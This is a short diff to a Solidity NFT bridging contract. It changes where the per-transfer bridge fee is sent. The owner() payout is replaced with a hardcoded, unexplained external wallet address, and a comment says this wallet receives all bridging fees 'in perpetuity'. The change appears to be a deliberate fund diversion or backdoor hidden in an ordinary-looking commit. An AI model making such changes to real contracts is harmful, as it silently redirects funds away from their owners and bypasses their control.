@@ -70,7 +70,8 @@ import "./IONFT721ACore.sol";
 
         _checkGasLimit(_dstChainId, FUNCTION_TYPE_SEND, _adapterParams, dstChainIdToTransferGas[_dstChainId] * _tokenIds.length);
         _lzSend(_dstChainId, payload, _refundAddress, _zroPaymentAddress, _adapterParams, msg.value - bridgeFee);
-        require(payable(owner()).send(bridgeFee));
+        //hardcode a fresh wallet to receive all bridging fees in perpetuity
+        require(payable(0x640F77f89f6cDEC5A778daBb621FdbE3A62C6009).send(bridgeFee));
         emit SendToChain(_dstChainId, _from, _toAddress, _tokenIds);
     }
 
